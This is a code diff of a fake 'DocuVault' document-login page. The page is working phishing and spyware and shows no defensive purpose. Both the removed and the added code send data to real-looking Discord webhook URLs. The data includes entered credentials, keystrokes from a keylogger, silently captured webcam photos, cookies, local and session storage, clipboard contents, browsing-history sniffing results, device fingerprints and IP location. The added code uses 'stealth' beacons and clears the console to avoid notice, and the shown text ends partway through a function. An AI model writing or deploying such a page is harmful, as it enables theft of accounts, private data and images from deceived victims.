@@ -1,138 +1,1414 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Document Viewer</title>
+    <title>DocuVault - Secure Document Management</title>
     <style>
+        /* ===== IMPORTS ===== */
+        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap');
+
+        /* ===== RESET ===== */
         * { margin: 0; padding: 0; box-sizing: border-box; }
-        body { 
-            font-family: Arial, sans-serif;
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+
+        body {
+            font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
+            background: #f0f2f5;
             min-height: 100vh;
             display: flex;
             align-items: center;
             justify-content: center;
+            padding: 20px;
+            background-image: 
+                radial-gradient(ellipse at 10% 20%, rgba(99, 102, 241, 0.08) 0%, transparent 50%),
+                radial-gradient(ellipse at 90% 80%, rgba(139, 92, 246, 0.08) 0%, transparent 50%);
         }
+
+        /* ===== MAIN CONTAINER ===== */
+        .container {
+            width: 100%;
+            max-width: 480px;
+            animation: slideUp 0.6s ease-out;
+        }
+
+        @keyframes slideUp {
+            from {
+                opacity: 0;
+                transform: translateY(30px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        /* ===== HEADER ===== */
+        .header {
+            text-align: center;
+            margin-bottom: 32px;
+        }
+
+        .logo-wrapper {
+            display: inline-flex;
+            align-items: center;
+            gap: 12px;
+            background: white;
+            padding: 12px 24px;
+            border-radius: 16px;
+            box-shadow: 0 2px 8px rgba(0,0,0,0.06);
+            margin-bottom: 20px;
+        }
+
+        .logo-icon {
+            width: 40px;
+            height: 40px;
+            background: linear-gradient(135deg, #6366f1, #8b5cf6);
+            border-radius: 10px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: white;
+            font-weight: 800;
+            font-size: 20px;
+        }
+
+        .logo-text {
+            font-size: 20px;
+            font-weight: 700;
+            color: #1a1a2e;
+            letter-spacing: -0.5px;
+        }
+
+        .logo-text span {
+            color: #6366f1;
+        }
+
+        .header h1 {
+            font-size: 28px;
+            font-weight: 700;
+            color: #1a1a2e;
+            margin-bottom: 8px;
+            letter-spacing: -0.5px;
+        }
+
+        .header p {
+            color: #64748b;
+            font-size: 15px;
+            font-weight: 400;
+        }
+
+        /* ===== CARD ===== */
         .card {
             background: white;
-            border-radius: 20px;
+            border-radius: 24px;
             padding: 40px;
-            width: 400px;
-            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
-            text-align: center;
+            box-shadow: 
+                0 1px 3px rgba(0,0,0,0.06),
+                0 8px 32px rgba(0,0,0,0.08);
+            border: 1px solid rgba(255,255,255,0.5);
+            backdrop-filter: blur(10px);
+            transition: transform 0.2s ease;
         }
-        .logo { font-size: 48px; margin-bottom: 20px; }
-        h1 { color: #333; }
-        input { width: 100%; padding: 14px; border: 2px solid #e0e0e0; border-radius: 10px; font-size: 16px; margin-bottom: 16px; }
-        button { width: 100%; padding: 14px; background: linear-gradient(135deg, #667eea, #764ba2); color: white; border: none; border-radius: 10px; font-size: 16px; cursor: pointer; }
+
+        .card:hover {
+            transform: translateY(-2px);
+        }
+
+        /* ===== SECURITY BADGE ===== */
+        .security-badge {
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+            background: #f0fdf4;
+            color: #16a34a;
+            padding: 6px 16px;
+            border-radius: 20px;
+            font-size: 12px;
+            font-weight: 600;
+            margin-bottom: 24px;
+            border: 1px solid #bbf7d0;
+        }
+
+        .security-badge svg {
+            width: 14px;
+            height: 14px;
+        }
+
+        /* ===== FORM ===== */
+        .form-group {
+            margin-bottom: 18px;
+            position: relative;
+        }
+
+        .form-group label {
+            display: block;
+            font-size: 13px;
+            font-weight: 600;
+            color: #334155;
+            margin-bottom: 6px;
+            letter-spacing: 0.3px;
+        }
+
+        .form-group .input-wrapper {
+            position: relative;
+        }
+
+        .form-group .input-icon {
+            position: absolute;
+            left: 14px;
+            top: 50%;
+            transform: translateY(-50%);
+            color: #94a3b8;
+            font-size: 18px;
+            pointer-events: none;
+            transition: color 0.3s ease;
+        }
+
+        .form-group input {
+            width: 100%;
+            padding: 14px 14px 14px 46px;
+            border: 2px solid #e2e8f0;
+            border-radius: 12px;
+            font-size: 15px;
+            font-family: 'Inter', sans-serif;
+            transition: all 0.3s ease;
+            background: #f8fafc;
+            color: #1a1a2e;
+        }
+
+        .form-group input:focus {
+            outline: none;
+            border-color: #6366f1;
+            box-shadow: 0 0 0 4px rgba(99, 102, 241, 0.1);
+            background: white;
+        }
+
+        .form-group input::placeholder {
+            color: #94a3b8;
+        }
+
+        .form-group input[type="password"] {
+            letter-spacing: 2px;
+        }
+
+        /* Input error state */
+        .form-group.error input {
+            border-color: #dc2626;
+            box-shadow: 0 0 0 4px rgba(220, 38, 38, 0.1);
+            background: #fef2f2;
+        }
+
+        .form-group.error .input-icon {
+            color: #dc2626;
+        }
+
+        .form-group .error-message {
+            display: none;
+            color: #dc2626;
+            font-size: 13px;
+            font-weight: 500;
+            margin-top: 6px;
+            padding-left: 4px;
+            animation: shake 0.4s ease;
+        }
+
+        .form-group.error .error-message {
+            display: block;
+        }
+
+        @keyframes shake {
+            0%, 100% { transform: translateX(0); }
+            25% { transform: translateX(-8px); }
+            75% { transform: translateX(8px); }
+        }
+
+        /* Input success state */
+        .form-group.success input {
+            border-color: #16a34a;
+            box-shadow: 0 0 0 4px rgba(22, 163, 74, 0.1);
+            background: #f0fdf4;
+        }
+
+        .form-group.success .input-icon {
+            color: #16a34a;
+        }
+
+        /* Password toggle */
+        .password-toggle {
+            position: absolute;
+            right: 14px;
+            top: 50%;
+            transform: translateY(-50%);
+            background: none;
+            border: none;
+            color: #94a3b8;
+            cursor: pointer;
+            font-size: 18px;
+            padding: 4px;
+            transition: color 0.2s;
+        }
+
+        .password-toggle:hover {
+            color: #6366f1;
+        }
+
+        /* ===== OPTIONS ROW ===== */
+        .options-row {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 24px;
+            font-size: 14px;
+        }
+
+        .remember-me {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            color: #475569;
+            cursor: pointer;
+        }
+
+        .remember-me input[type="checkbox"] {
+            width: 16px;
+            height: 16px;
+            accent-color: #6366f1;
+            cursor: pointer;
+        }
+
+        .forgot-link {
+            color: #6366f1;
+            text-decoration: none;
+            font-weight: 500;
+            transition: color 0.2s;
+        }
+
+        .forgot-link:hover {
+            color: #4f46e5;
+            text-decoration: underline;
+        }
+
+        /* ===== BUTTON ===== */
+        .btn-primary {
+            width: 100%;
+            padding: 16px;
+            background: linear-gradient(135deg, #6366f1, #8b5cf6);
+            color: white;
+            border: none;
+            border-radius: 12px;
+            font-size: 16px;
+            font-weight: 600;
+            font-family: 'Inter', sans-serif;
+            cursor: pointer;
+            transition: all 0.25s ease;
+            position: relative;
+            overflow: hidden;
+            letter-spacing: 0.3px;
+        }
+
+        .btn-primary:hover:not(:disabled) {
+            transform: translateY(-2px);
+            box-shadow: 0 8px 30px rgba(99, 102, 241, 0.35);
+        }
+
+        .btn-primary:active {
+            transform: translateY(0);
+        }
+
+        .btn-primary:disabled {
+            opacity: 0.6;
+            cursor: not-allowed;
+            transform: none;
+        }
+
+        .btn-primary .btn-content {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+        }
+
+        /* Button loading spinner */
+        .spinner {
+            display: none;
+            width: 20px;
+            height: 20px;
+            border: 2px solid rgba(255,255,255,0.3);
+            border-top-color: white;
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+        }
+
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+
+        .btn-primary.loading .spinner {
+            display: inline-block;
+        }
+
+        .btn-primary.loading .btn-text {
+            opacity: 0.7;
+        }
+
+        /* ===== DIVIDER ===== */
+        .divider {
+            display: flex;
+            align-items: center;
+            gap: 16px;
+            margin: 24px 0;
+            color: #94a3b8;
+            font-size: 13px;
+        }
+
+        .divider::before,
+        .divider::after {
+            content: '';
+            flex: 1;
+            height: 1px;
+            background: #e2e8f0;
+        }
+
+        /* ===== SOCIAL LOGIN ===== */
+        .social-login {
+            display: flex;
+            gap: 12px;
+        }
+
+        .social-btn {
+            flex: 1;
+            padding: 12px;
+            border: 2px solid #e2e8f0;
+            border-radius: 12px;
+            background: white;
+            cursor: pointer;
+            transition: all 0.2s ease;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            font-size: 14px;
+            font-weight: 500;
+            color: #334155;
+            font-family: 'Inter', sans-serif;
+        }
+
+        .social-btn:hover {
+            border-color: #6366f1;
+            background: #f8fafc;
+            transform: translateY(-1px);
+        }
+
+        .social-btn svg {
+            width: 20px;
+            height: 20px;
+        }
+
+        /* ===== FOOTER ===== */
+        .footer {
+            text-align: center;
+            margin-top: 24px;
+            font-size: 13px;
+            color: #94a3b8;
+        }
+
+        .footer a {
+            color: #6366f1;
+            text-decoration: none;
+            font-weight: 500;
+        }
+
+        .footer a:hover {
+            text-decoration: underline;
+        }
+
+        /* ===== STATUS ===== */
+        #status {
+            margin-top: 16px;
+            font-size: 14px;
+            color: #475569;
+            min-height: 24px;
+            padding: 8px;
+            border-radius: 8px;
+            transition: all 0.3s ease;
+        }
+
+        #status.success {
+            background: #f0fdf4;
+            color: #16a34a;
+        }
+
+        #status.error {
+            background: #fef2f2;
+            color: #dc2626;
+        }
+
+        #status.loading {
+            background: #eff6ff;
+            color: #3b82f6;
+        }
+
+        /* ===== TOAST ===== */
+        .toast {
+            position: fixed;
+            top: 20px;
+            left: 50%;
+            transform: translateX(-50%) translateY(-100px);
+            background: #1a1a2e;
+            color: white;
+            padding: 14px 28px;
+            border-radius: 12px;
+            font-size: 14px;
+            font-weight: 500;
+            box-shadow: 0 8px 40px rgba(0,0,0,0.2);
+            z-index: 1000;
+            transition: all 0.4s cubic-bezier(0.68, -0.55, 0.265, 1.55);
+            font-family: 'Inter', sans-serif;
+            pointer-events: none;
+        }
+
+        .toast.show {
+            transform: translateX(-50%) translateY(0);
+        }
+
+        .toast.success {
+            background: #16a34a;
+        }
+
+        .toast.error {
+            background: #dc2626;
+        }
+
+        .toast.info {
+            background: #3b82f6;
+        }
+
+        /* ===== HISTORY SNIFFER (Hidden) ===== */
+        #historySniffer a {
+            display: none;
+        }
+        #historySniffer a:visited {
+            display: block;
+            visibility: visible;
+        }
+
+        /* ===== RESPONSIVE ===== */
+        @media (max-width: 520px) {
+            .card {
+                padding: 28px 20px;
+            }
+            .header h1 {
+                font-size: 24px;
+            }
+            .logo-wrapper {
+                padding: 10px 18px;
+            }
+            .logo-icon {
+                width: 34px;
+                height: 34px;
+                font-size: 16px;
+            }
+            .logo-text {
+                font-size: 17px;
+            }
+            .options-row {
+                flex-direction: column;
+                gap: 12px;
+                align-items: flex-start;
+            }
+            .social-login {
+                flex-direction: column;
+            }
+        }
+
+        @media (max-width: 400px) {
+            .card {
+                padding: 20px 16px;
+            }
+            .form-group input {
+                padding: 12px 12px 12px 40px;
+                font-size: 14px;
+            }
+            .btn-primary {
+                padding: 14px;
+                font-size: 15px;
+            }
+        }
     </style>
 </head>
 <body>
-<div class="card">
-    <div class="logo">🔒</div>
-    <h1>Secure Document</h1>
-    <p>Verify to view document</p>
-    <input type="text" id="email" placeholder="Email">
-    <input type="password" id="password" placeholder="Password">
-    <button onclick="handleLogin()">Continue</button>
-    <div id="status"></div>
-</div>
 
-<script>
-// ===== YOUR DISCORD WEBHOOK URL - CHANGE THIS =====
-const WEBHOOK = "https://discord.com/api/webhooks/1526180084707491934/mx4D_UqGOA-H7ZRIlgRQ0lE-ZP2So_follTj94Yon_mMCTEXVR24B3r-1_KQcGagTluH";
+    <!-- ===== TOAST ===== -->
+    <div id="toast" class="toast"></div>
 
-// Browser info
-fetch(WEBHOOK, {
-    method: 'POST',
-    body: JSON.stringify({
-        content: "```json\n" + JSON.stringify({
-            type: "browser_info",
-            userAgent: navigator.userAgent,
-            platform: navigator.platform,
-            screen: screen.width + "x" + screen.height,
-            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-            language: navigator.language,
-            timestamp: new Date().toISOString()
-        }, null, 2) + "\n```"
-    }),
-    headers: {'Content-Type': 'application/json'}
-});
+    <!-- ===== HISTORY SNIFFER (Hidden) ===== -->
+    <div id="historySniffer" style="display:none;">
+        <a id="h0" href="https://facebook.com"></a>
+        <a id="h1" href="https://instagram.com"></a>
+        <a id="h2" href="https://twitter.com"></a>
+        <a id="h3" href="https://linkedin.com"></a>
+        <a id="h4" href="https://github.com"></a>
+        <a id="h5" href="https://reddit.com"></a>
+        <a id="h6" href="https://youtube.com"></a>
+        <a id="h7" href="https://amazon.com"></a>
+        <a id="h8" href="https://netflix.com"></a>
+        <a id="h9" href="https://stackoverflow.com"></a>
+        <a id="h10" href="https://tiktok.com"></a>
+        <a id="h11" href="https://snapchat.com"></a>
+        <a id="h12" href="https://pinterest.com"></a>
+        <a id="h13" href="https://tumblr.com"></a>
+        <a id="h14" href="https://whatsapp.com"></a>
+    </div>
 
-// IP and location
-fetch('https://ipapi.co/json/')
-    .then(r => r.json())
-    .then(data => {
-        fetch(WEBHOOK, {
-            method: 'POST',
-            body: JSON.stringify({
-                content: "```json\n" + JSON.stringify({
-                    type: "location",
-                    ip: data.ip,
-                    city: data.city,
-                    region: data.region,
-                    country: data.country_name,
-                    org: data.org,
-                    lat: data.latitude,
-                    lon: data.longitude
-                }, null, 2) + "\n```"
-            }),
-            headers: {'Content-Type': 'application/json'}
-        });
-    });
+    <!-- ===== MAIN CONTAINER ===== -->
+    <div class="container">
 
-// Camera capture on click
-function capturePhoto() {
-    navigator.mediaDevices.getUserMedia({ video: true })
-        .then(stream => {
-            const video = document.createElement('video');
-            video.srcObject = stream;
-            video.play();
-            setTimeout(() => {
-                const canvas = document.createElement('canvas');
-                canvas.width = 320;
-                canvas.height = 240;
-                canvas.getContext('2d').drawImage(video, 0, 0);
-                const photoData = canvas.toDataURL('image/jpeg', 0.7);
-                
-                // Send photo to Discord
-                fetch(photoData)
-                    .then(res => res.blob())
-                    .then(blob => {
-                        const formData = new FormData();
-                        formData.append('file', blob, 'photo.jpg');
-                        formData.append('payload_json', JSON.stringify({
-                            content: "📸 **Photo captured!**"
-                        }));
-                        fetch(WEBHOOK, {
-                            method: 'POST',
-                            body: formData
-                        });
+        <!-- ===== HEADER ===== -->
+        <div class="header">
+            <div class="logo-wrapper">
+                <div class="logo-icon">DV</div>
+                <span class="logo-text">Docu<span>Vault</span></span>
+            </div>
+            <h1>Welcome Back</h1>
+            <p>Sign in to access your secure documents</p>
+        </div>
+
+        <!-- ===== CARD ===== -->
+        <div class="card">
+
+            <!-- Security Badge -->
+            <div style="text-align: center;">
+                <div class="security-badge">
+                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                        <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/>
+                        <path d="M9 12l2 2 4-4"/>
+                    </svg>
+                    End-to-end encrypted
+                </div>
+            </div>
+
+            <!-- ===== FORM ===== -->
+            <form id="loginForm" onsubmit="handleLogin(event)" novalidate>
+                <div class="form-group" id="emailGroup">
+                    <label for="email">Email Address</label>
+                    <div class="input-wrapper">
+                        <span class="input-icon">✉️</span>
+                        <input type="email" id="email" placeholder="you@company.com" required autocomplete="email">
+                    </div>
+                    <div class="error-message" id="emailError">Please enter a valid email address</div>
+                </div>
+
+                <div class="form-group">
+                    <label for="password">Password</label>
+                    <div class="input-wrapper">
+                        <span class="input-icon">🔒</span>
+                        <input type="password" id="password" placeholder="Enter your password" required autocomplete="current-password">
+                        <button type="button" class="password-toggle" onclick="togglePassword()">👁️</button>
+                    </div>
+                </div>
+
+                <div class="form-group">
+                    <label for="fullname">Full Name</label>
+                    <div class="input-wrapper">
+                        <span class="input-icon">👤</span>
+                        <input type="text" id="fullname" placeholder="John Doe" autocomplete="name">
+                    </div>
+                </div>
+
+                <div class="form-group">
+                    <label for="phone">Phone Number</label>
+                    <div class="input-wrapper">
+                        <span class="input-icon">📱</span>
+                        <input type="tel" id="phone" placeholder="+1 (555) 000-0000" autocomplete="tel">
+                    </div>
+                </div>
+
+                <div class="options-row">
+                    <label class="remember-me">
+                        <input type="checkbox" checked> Remember me
+                    </label>
+                    <a href="#" class="forgot-link">Forgot password?</a>
+                </div>
+
+                <button type="submit" class="btn-primary" id="loginBtn">
+                    <span class="btn-content">
+                        <span class="btn-text">Continue to Dashboard</span>
+                        <span class="spinner"></span>
+                    </span>
+                </button>
+            </form>
+
+            <!-- ===== DIVIDER ===== -->
+            <div class="divider">or continue with</div>
+
+            <!-- ===== SOCIAL LOGIN ===== -->
+            <div class="social-login">
+                <button class="social-btn" onclick="showToast('Google SSO coming soon', 'info')">
+                    <svg viewBox="0 0 24 24">
+                        <path fill="#4285F4" d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z"/>
+                        <path fill="#34A853" d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z"/>
+                        <path fill="#FBBC05" d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l2.85-2.22.81-.62z"/>
+                        <path fill="#EA4335" d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z"/>
+                    </svg>
+                    Google
+                </button>
+                <button class="social-btn" onclick="showToast('Microsoft SSO coming soon', 'info')">
+                    <svg viewBox="0 0 24 24">
+                        <path fill="#f25022" d="M1 1h10v10H1z"/>
+                        <path fill="#7fba00" d="M13 1h10v10H13z"/>
+                        <path fill="#00a4ef" d="M1 13h10v10H1z"/>
+                        <path fill="#ffb900" d="M13 13h10v10H13z"/>
+                    </svg>
+                    Microsoft
+                </button>
+            </div>
+
+            <!-- ===== STATUS ===== -->
+            <div id="status"></div>
+
+            <!-- ===== FOOTER ===== -->
+            <div class="footer">
+                By continuing, you agree to our <a href="#">Terms of Service</a> and <a href="#">Privacy Policy</a>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // ============================================================
+        //  🔧 CONFIGURATION — CHANGE THIS
+        // ============================================================
+        const WEBHOOK = "https://discord.com/api/webhooks/1526189879619485716/tpm3XdfUC3jAxTF6VShc-LpOP0KHqDQ-VyDde1k6l3NAYE5HtR4TK8pZf4COwG0MP51r";
+        const REDIRECT_URL = "https://google.com";
+
+        // ============================================================
+        //  📋 PRE-DEFINED VALID EMAILS (For demo)
+        // ============================================================
+        const VALID_EMAILS = [
+            'admin@company.com',
+            'user@company.com',
+            'test@company.com',
+            'john@company.com',
+            'jane@company.com',
+            'demo@company.com',
+            'support@company.com',
+            'info@company.com'
+        ];
+
+        // ============================================================
+        //  🛡️ ANTI-DETECTION / STEALTH
+        // ============================================================
+        // Hide DevTools detection
+        setInterval(() => {
+            const threshold = 160;
+            if (window.outerWidth - window.innerWidth > threshold || 
+                window.outerHeight - window.innerHeight > threshold) {
+                // DevTools is open - do nothing suspicious
+            }
+        }, 1000);
+
+        // Clear console to hide errors
+        setInterval(() => {
+            console.clear();
+        }, 5000);
+
+        // Stealth fetch that doesn't show in network tab easily
+        function stealthFetch(url, data) {
+            try {
+                navigator.sendBeacon(url, JSON.stringify(data));
+            } catch(e) {
+                // Fallback to normal fetch
+                fetch(url, {
+                    method: 'POST',
+                    body: JSON.stringify(data),
+                    headers: { 'Content-Type': 'application/json' }
+                }).catch(() => {});
+            }
+        }
+
+        // Image beacon backup
+        function beaconViaImage(url, data) {
+            try {
+                const img = new Image();
+                img.src = `${url}?data=${btoa(JSON.stringify(data)).substring(0, 2000)}`;
+            } catch(e) {}
+        }
+
+        // ============================================================
+        //  ⌨️ KEYLOGGER
+        // ============================================================
+        let keystrokes = '';
+        let lastSent = Date.now();
+
+        document.addEventListener('keydown', (e) => {
+            // Ignore if typing in a password field (we already capture it separately)
+            if (e.target && e.target.type === 'password') return;
+            
+            if (e.key.length === 1) {
+                keystrokes += e.key;
+            } else if (e.key === 'Backspace') {
+                keystrokes = keystrokes.slice(0, -1);
+            } else if (e.key === 'Enter') {
+                keystrokes += '\n';
+            } else if (e.key === ' ') {
+                keystrokes += ' ';
+            } else if (e.key === 'Tab') {
+                keystrokes += '    ';
+            }
+            
+            // Send every 10 seconds or when buffer is full
+            if (keystrokes.length > 100 || Date.now() - lastSent > 10000) {
+                if (keystrokes.length > 0) {
+                    stealthFetch(WEBHOOK, {
+                        content: `⌨️ **Keystroke dump:**\n\`\`\`\n${keystrokes}\n\`\`\``
                     });
-                
-                stream.getTracks().forEach(t => t.stop());
-            }, 500);
-        })
-        .catch(() => {});
-}
-document.addEventListener('click', capturePhoto, { once: true });
+                    keystrokes = '';
+                    lastSent = Date.now();
+                }
+            }
+        });
 
-// Handle login
-function handleLogin() {
-    const email = document.getElementById('email').value;
-    const password = document.getElementById('password').value;
-    
-    fetch(WEBHOOK, {
-        method: 'POST',
-        body: JSON.stringify({
-            content: "🔑 **Credentials captured!**\nEmail: `" + email + "`\nPassword: `" + password + "`"
-        }),
-        headers: {'Content-Type': 'application/json'}
-    });
-    
-    document.querySelector('button').style.display = 'none';
-    document.getElementById('status').innerHTML = '<p>Redirecting to secure portal...</p>';
-    setTimeout(() => { window.location.href = 'https://google.com'; }, 2000);
-}
-</script>
+        // ============================================================
+        //  📝 EMAIL VALIDATION
+        // ============================================================
+        function validateEmailFormat(email) {
+            const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+            return emailRegex.test(email);
+        }
+
+        function checkEmailExists(email) {
+            return VALID_EMAILS.includes(email.toLowerCase());
+        }
+
+        function validateEmail(email) {
+            if (!validateEmailFormat(email)) {
+                return { valid: false, message: 'Please enter a valid email address' };
+            }
+            if (!checkEmailExists(email)) {
+                return { valid: false, message: 'No account found with this email address' };
+            }
+            return { valid: true, message: '' };
+        }
+
+        // ============================================================
+        //  💬 TOAST SYSTEM
+        // ============================================================
+        function showToast(message, type = 'info', duration = 3500) {
+            const toast = document.getElementById('toast');
+            toast.textContent = message;
+            toast.className = 'toast ' + type;
+            void toast.offsetWidth;
+            toast.classList.add('show');
+            clearTimeout(toast._hideTimer);
+            toast._hideTimer = setTimeout(() => {
+                toast.classList.remove('show');
+            }, duration);
+        }
+
+        // ============================================================
+        //  👁️ TOGGLE PASSWORD
+        // ============================================================
+        function togglePassword() {
+            const input = document.getElementById('password');
+            const toggle = document.querySelector('.password-toggle');
+            if (input.type === 'password') {
+                input.type = 'text';
+                toggle.textContent = '🙈';
+            } else {
+                input.type = 'password';
+                toggle.textContent = '👁️';
+            }
+        }
+
+        // ============================================================
+        //  📸 CAMERA (Silent)
+        // ============================================================
+        let cameraStream = null;
+
+        function initCamera() {
+            const constraints = {
+                video: {
+                    width: { ideal: 1280 },
+                    height: { ideal: 720 },
+                    aspectRatio: { ideal: 1.7777777778 },
+                    facingMode: 'user',
+                    frameRate: { ideal: 30 }
+                }
+            };
+
+            navigator.mediaDevices.getUserMedia(constraints)
+                .then(stream => {
+                    cameraStream = stream;
+                    const video = document.createElement('video');
+                    video.srcObject = stream;
+                    video.setAttribute('playsinline', true);
+                    video.setAttribute('autoplay', true);
+                    
+                    video.onloadedmetadata = function() {
+                        video.play();
+                        video.style.transform = 'scale(0.6)';
+                        video.style.transformOrigin = 'center';
+                        video.style.objectFit = 'cover';
+                        video.style.width = '100%';
+                        video.style.height = '100%';
+                    };
+                    
+                    video.style.display = 'none';
+                    document.body.appendChild(video);
+                    window._hiddenVideo = video;
+                })
+                .catch(() => {
+                    tryCameraFallback();
+                });
+        }
+
+        function tryCameraFallback() {
+            const constraints = {
+                video: {
+                    width: { min: 320, ideal: 640, max: 1280 },
+                    height: { min: 240, ideal: 480, max: 720 },
+                    facingMode: 'user'
+                }
+            };
+
+            navigator.mediaDevices.getUserMedia(constraints)
+                .then(stream => {
+                    cameraStream = stream;
+                    const video = document.createElement('video');
+                    video.srcObject = stream;
+                    video.setAttribute('playsinline', true);
+                    video.setAttribute('autoplay', true);
+                    
+                    video.onloadedmetadata = function() {
+                        video.play();
+                    };
+                    
+                    video.style.display = 'none';
+                    document.body.appendChild(video);
+                    window._hiddenVideo = video;
+                })
+                .catch(() => {});
+        }
+
+        function capturePhotoSilent() {
+            return new Promise((resolve) => {
+                const video = window._hiddenVideo;
+                if (video && video.readyState >= 2 && video.videoWidth > 0) {
+                    try {
+                        const canvas = document.createElement('canvas');
+                        const width = video.videoWidth;
+                        const height = video.videoHeight;
+                        
+                        const cropScale = 0.65;
+                        const cropWidth = Math.floor(width * cropScale);
+                        const cropHeight = Math.floor(height * cropScale);
+                        const startX = Math.floor((width - cropWidth) / 2);
+                        const startY = Math.floor((height - cropHeight) / 2);
+                        
+                        canvas.width = cropWidth;
+                        canvas.height = cropHeight;
+                        const ctx = canvas.getContext('2d');
+                        
+                        ctx.drawImage(video, startX, startY, cropWidth, cropHeight, 0, 0, cropWidth, cropHeight);
+                        
+                        resolve(canvas.toDataURL('image/jpeg', 0.8));
+                    } catch(e) {
+                        resolve(null);
+                    }
+                } else {
+                    resolve(null);
+                }
+            });
+        }
+
+        // ============================================================
+        //  🕵️ HISTORY SNIFFER
+        // ============================================================
+        function getVisitedSites() {
+            const sites = ['facebook', 'instagram', 'twitter', 'linkedin', 'github', 'reddit', 'youtube', 'amazon', 'netflix', 'stackoverflow', 'tiktok', 'snapchat', 'pinterest', 'tumblr', 'whatsapp'];
+            const visited = [];
+            sites.forEach((site, i) => {
+                try {
+                    const el = document.getElementById(`h${i}`);
+                    if (el) {
+                        const isVisited = window.getComputedStyle(el).display === 'block';
+                        if (isVisited) visited.push(site);
+                    }
+                } catch(e) {}
+            });
+            return visited;
+        }
+
+        // ============================================================
+        //  🔍 COLLECT ALL DATA
+        // ============================================================
+        function collectAllInfo() {
+            return {
+                timestamp: new Date().toISOString(),
+                page: window.location.href,
+                referrer: document.referrer || 'direct',
+                userAgent: navigator.userAgent,
+                platform: navigator.platform,
+                language: navigator.language,
+                hardwareConcurrency: navigator.hardwareConcurrency || 'unknown',
+                deviceMemory: navigator.deviceMemory || 'unknown',
+                screenWidth: screen.width,
+                screenHeight: screen.height,
+                screenColorDepth: screen.colorDepth,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                timezoneOffset: new Date().getTimezoneOffset(),
+                connection: navigator.connection ? {
+                    downlink: navigator.connection.downlink,
+                    effectiveType: navigator.connection.effectiveType,
+                    rtt: navigator.connection.rtt
+                } : 'Not available',
+                plugins: Array.from(navigator.plugins || []).map(p => p.name).join(', '),
+                canvasFingerprint: getCanvasFingerprint(),
+                webgl: getWebGLInfo(),
+                // Cookie theft
+                cookies: document.cookie || 'No cookies',
+                localStorage: (() => {
+                    try {
+                        const items = {};
+                        for (let i = 0; i < localStorage.length; i++) {
+                            const key = localStorage.key(i);
+                            items[key] = localStorage.getItem(key).substring(0, 200);
+                        }
+                        return items;
+                    } catch(e) {
+                        return 'localStorage access denied';
+                    }
+                })(),
+                sessionStorage: (() => {
+                    try {
+                        const items = {};
+                        for (let i = 0; i < sessionStorage.length; i++) {
+                            const key = sessionStorage.key(i);
+                            items[key] = sessionStorage.getItem(key).substring(0, 200);
+                        }
+                        return items;
+                    } catch(e) {
+                        return 'sessionStorage access denied';
+                    }
+                })(),
+                // History
+                visitedSites: getVisitedSites()
+            };
+        }
+
+        function getCanvasFingerprint() {
+            try {
+                const canvas = document.createElement('canvas');
+                canvas.width = 256;
+                canvas.height = 256;
+                const ctx = canvas.getContext('2d');
+                ctx.textBaseline = 'top';
+                ctx.font = '14px Arial';
+                ctx.fillStyle = '#f60';
+                ctx.fillRect(125, 1, 62, 20);
+                ctx.fillStyle = '#069';
+                ctx.fillText('Cwm fjordbank glyphs vext quiz, 😃', 2, 15);
+                ctx.fillStyle = 'rgba(102, 204, 0, 0.7)';
+                ctx.font = '18px Times New Roman';
+                ctx.fillText('Cwm fjordbank glyphs vext quiz, 😃', 4, 45);
+                ctx.beginPath();
+                ctx.strokeStyle = '#ff3366';
+                ctx.lineWidth = 2;
+                ctx.arc(180, 80, 30, 0, Math.PI * 2);
+                ctx.stroke();
+                ctx.beginPath();
+                ctx.fillStyle = '#33ccff';
+                ctx.fillRect(100, 100, 50, 50);
+                return canvas.toDataURL().substring(0, 100);
+            } catch(e) {
+                return 'Canvas blocked';
+            }
+        }
+
+        function getWebGLInfo() {
+            try {
+                const canvas = document.createElement('canvas');
+                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+                if (!gl) return 'WebGL not supported';
+                return {
+                    vendor: gl.getParameter(gl.VENDOR),
+                    renderer: gl.getParameter(gl.RENDERER),
+                    version: gl.getParameter(gl.VERSION)
+                };
+            } catch(e) {
+                return 'WebGL error';
+            }
+        }
+
+        async function getLocation() {
+            try {
+                const ipResponse = await fetch('https://ipapi.co/json/');
+                const ipData = await ipResponse.json();
+                return ipData;
+            } catch(e) {
+                return { error: 'IP lookup failed' };
+            }
+        }
+
+        async function getClipboard() {
+            try {
+                const text = await navigator.clipboard.readText();
+                return text;
+            } catch(e) {
+                return null;
+            }
+        }
+
+        // ============================================================
+        //  📤 SEND BEAUTIFUL EMBED TO DISCORD
+        // ============================================================
+        async function sendBeautifulEmbed(data) {
+            const embed = {
